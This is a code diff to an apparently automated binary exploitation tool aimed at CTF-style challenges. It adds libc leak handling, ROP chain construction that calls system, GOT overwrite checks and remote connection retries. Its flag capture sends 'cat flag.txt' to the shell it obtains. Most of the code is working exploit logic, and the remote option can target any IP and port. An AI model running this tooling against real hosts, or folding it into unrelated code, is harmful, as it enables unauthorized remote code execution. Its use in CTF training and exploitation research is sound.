@@ -27,6 +27,8 @@ class Against:
         self.binary_name = binary_path.split("/")[-1]
         self.elf = ELF(self.binary)
         self.libc = libc
+
+        self.libc_base = None
             
         self.machine = machine
         self.ip = ip
@@ -74,9 +76,20 @@ class Against:
         self.option = option
 
         if option == "REMOTE" and self.ip != None and self.port != None:
-            return remote(self.ip, self.port)
+            try:
+                p = remote(self.ip, self.port)
+                return p
+            except:
+                aegis_log.error(f"Service {self.ip} {self.port} could not be connected to")
+                return None
+
         elif option == "REMOTE" and self.ip != None and self.port == None:
-            return remote(self.ip, 443, ssl=True, sni=self.ip)
+            try:
+                p = remote(self.ip, 443, ssl=True, sni=self.ip)
+                return p
+            except:
+                aegis_log.error(f"Service {self.ip} could not be connected to")
+                return None
         elif option == "GDB":
             self.debug = True
             return gdb.debug(self.binary, gdbscript=gs)
@@ -233,7 +246,7 @@ class Against:
 
         chain += p64(leak_gadget) + p64(got_function) 
         if self.leak_function == "printf":
-            chain += p64(self.elf.sym["_fini"])
+            #chain += p64(self.elf.sym["_fini"])
             chain += p64(plt_function)
             chain += p64(self.elf.sym["_fini"])
             chain += p64(main)
@@ -255,8 +268,8 @@ class Against:
         while match == None and attempts <= 20:  
             try:
                 output = p.recvline(timeout=2)
-            except EOFError:
-                aegis_log.error(f"[{self.binary_name}] Could not find libc leak")
+            except EOFError as e:
+                aegis_log.error(f"[{self.binary_name}] Could not find libc leak {e}")
                 break
             match = pattern.search(output)
             attempts += 1
@@ -265,11 +278,11 @@ class Against:
             leak = match.group(0)
             leak = u64(leak.ljust(8, b'\x00'))
             aegis_log.info(f"[{self.binary_name}] Found libc leak {hex(leak)}")
-            libc_base = leak - self.libc.sym[symb]
-            aegis_log.info(f"[{self.binary_name}] Calculated libc base {hex(libc_base)}")
+            self.libc_base = leak - self.libc.sym[symb]
+            aegis_log.info(f"[{self.binary_name}] Calculated libc base {hex(self.libc_base)}")
 
             self.libc_resolved = True
-            return libc_base
+            return self.libc_base
         else:
             aegis_log.warning(f"[{self.binary_name}] Failed to get libc leak")
             return None
@@ -300,7 +313,7 @@ class Against:
         end_addr = start_addr + value[1]
 
         if start_addr < got_section.start+0x18 or end_addr > got_section.end:
-            aegis_log.warning(f"Writing out of bounds of got section")
+            aegis_log.warning(f"Writing out of bounds of got section for {hex(target)}")
 
         aegis_log.debug(f"[{self.binary_name}] Writing to {hex(target)} with index {index} and {rem}\nStart of write {hex(start_addr)}, End of write {hex(end_addr)}")
 
@@ -479,15 +492,23 @@ class Against:
         self.check_exploit()
 
         if len(self.exploit) > 0 and self.format_exploit == None:
-            aegis_log.debug(f"Sending chain as {self.chain}") 
-            self.process.sendline(self.exploit)
-            if self.has_libc_leak == True:
-                libc_base = self.recv_libc_leak(self.process, self.leak_function)
-                if libc_base != None:
-                    self.libc_exploit = self.padding + self.rop_chain_libc(libc_base)
+            if self.machine.leak == True:
+                self.process.recvuntil(self.machine.format_leak_string.encode("utf-8"))
+                output = self.process.recvline().strip(b"\n")
+                if b"0x" in output:
 
-                    aegis_log.debug(f"Sending libc system chain {self.libc_exploit}")
-                    self.process.sendline(self.libc_exploit)
+                    leak = int(output.split(b"0x")[1],16)
+                    self.libc_base = leak - self.libc.sym[self.machine.leak_symbol]
+        
+            if self.has_libc_leak == True:
+                self.libc_base = self.recv_libc_leak(self.process, self.leak_function)
+
+            aegis_log.debug(f"Sending chain as {self.chain}") 
+            if self.libc_base != None:
+                aegis_log.debug(f"Sending libc system chain {self.libc_exploit}")
+                self.exploit = self.padding + self.rop_chain_libc(self.libc_base)
+
+            self.process.sendline(self.exploit)
 
         else:
             if self.format_exploit != None and self.array_exploit == None or len(self.array_exploit) == 0: 
@@ -518,12 +539,17 @@ class Against:
                             return True
             return False
         else:
-            for i in range(5):
+            for i in range(4):
                 aegis_log.critical(f"[{self.binary_name} Exploit failed trying again")
                 self.process = self.start(self.option)
                 self.send_exploit()
                 if self.recieve_flag() == 1:
-                    if self.flag != None or self.remote_flag != None:
+                    if self.option != "REMOTE":
+                        if self.flag != None:
+                            return True
+                    else:
+                        if self.remote_flag != None:
+                            aegis_log.debug(f"Captured flag {self.remote_flag}")
                             return True
  
             aegis_log.warn(f"[{self.binary_name}] Exploit failed")
@@ -538,12 +564,18 @@ class Against:
         try:
             for i in range(10):
                 self.process.sendline(b"cat flag.txt")
-                output = self.process.recvall(timeout=1)
-                match = self.flag_regex.search(output)
-                if match:
-                    break
-        except EOFError:
-            aegis_log.warn(f"Error recieving flag")
+            self.process.sendline(b"exit")
+        except EOFError as e:
+            aegis_log.warn(f"Error pipe broken")
+
+        try:
+            output = self.process.recvall(timeout=4)
+            match = self.flag_regex.search(output)
+        except EOFError as e:
+            aegis_log.warn(f"Error recieving flag {e}")
+            if not match:
+                return -1 
+
 
         if match:
             flag = self.flag_format.decode("utf-8") + "{" + match.group(1).decode('utf-8') + "}" 
@@ -552,9 +584,8 @@ class Against:
                 self.flag = flag
             else:
                 self.remote_flag = flag
-
             return 1
-        elif b"command not found" in output:
+        elif output != None and b"command not found" in output:
             aegis_log.error(f"[{self.binary_name}] Error from shell command")
             return 1
         else:
